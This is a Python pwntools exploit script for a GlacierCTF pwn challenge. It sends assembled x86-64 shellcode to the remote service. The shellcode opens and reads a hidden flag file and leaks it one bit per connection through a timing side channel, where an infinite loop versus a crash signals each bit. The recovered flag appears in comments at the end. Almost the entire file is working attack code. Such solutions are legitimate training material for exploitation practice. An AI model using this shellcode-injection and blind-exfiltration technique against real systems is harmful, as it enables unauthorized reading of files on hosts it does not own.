#!/usr/bin/env python3
from Crypto.Util.number import long_to_bytes
from pwn import *
import string

exe = context.binary = ELF(args.EXE or './vuln')
context.terminal = ["tmux", "splitw", "-h"]
host = args.HOST or 'chall.glacierctf.com'
port = int(args.PORT or 13383)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# read = 0x0
# getdents = 0x4e
# openat = 0x101
gdbscript = '''
tbreak *main+220
continue
'''.format(**locals())

shellcode = """
open_file:
    xor edi, edi
    sub edi, 0x64
    lea rsi, [rip+file]
    mov byte ptr[rsi+38], 0
    xor rdx, rdx
    xor r10, r10
    mov rax, 0x101
    syscall
    
readfile:
    mov edi, eax
    sub rsp, 0x1000
    mov rsi, rsp
    mov rdx, 0x1000
    xor rax, rax
    syscall

leak_flag_content:
    mov al, [rsp+{}]
    shr al, {}
    and al, 1
    test al, al

loop:
    jne loop


file:
    .ascii "./92b6a7746a414f259826adb75a8f6375.txt"
"""
#debug: if filename does exist it will always jump to loop
shellcode_ = """
open_file:
    xor edi, edi
    sub edi, 0x64
    lea rsi, [rip+file]
    mov byte ptr[rsi+38], 0
    xor rdx, rdx
    xor r10, r10
    mov rax, 0x101
    syscall

    cmp al, 0xfe
    jne loop
    
readfile:
    mov edi, eax
    sub rsp, 0x1000
    mov rsi, rsp
    mov rdx, 0x1000
    xor rax, rax
    syscall

leak_flag_content:
    mov al, [rsp+{}]
    shr al, {}
    and al, 1
    test al, al

loop:
    jne loop


file:
    .ascii "./92b6a7746a414f259826adb75a8f6375.txt"
"""
#b'92b6a7746a\x0014f259826adb75a8f6375.txt' from exploit_1.py

flag_file = 0
ctr = 0
context.timeout = 2
context.log_level = "error"
from rich.progress import track
i = 0
for byte_offset in track(range(0,40)):
    for bit_offset in range(8):
        try:
            io = start()
            payload = asm(shellcode.format(byte_offset, bit_offset), arch="amd64", bits=64)
            #print(f"Shellcode length: {hex(len(payload))}")
            io.sendlineafter(b"Shellcode:", payload)
            io.readline()
            io.close()
            print(f"Got a 1 with : {byte_offset}:{bit_offset}")
            flag_file |= (1 << ctr)
            print(hex(flag_file))
        except Exception as e:
            pass
        ctr += 1
    i += 1

print(long_to_bytes(flag_file)[::-1])

#gctf{W41t_\x001D_yoU_R3aLlY_r3Bu1Ld_L$?}
#=>gctf{W41t_d1D_yoU_R3aLlY_r3Bu1Ld_L$?}
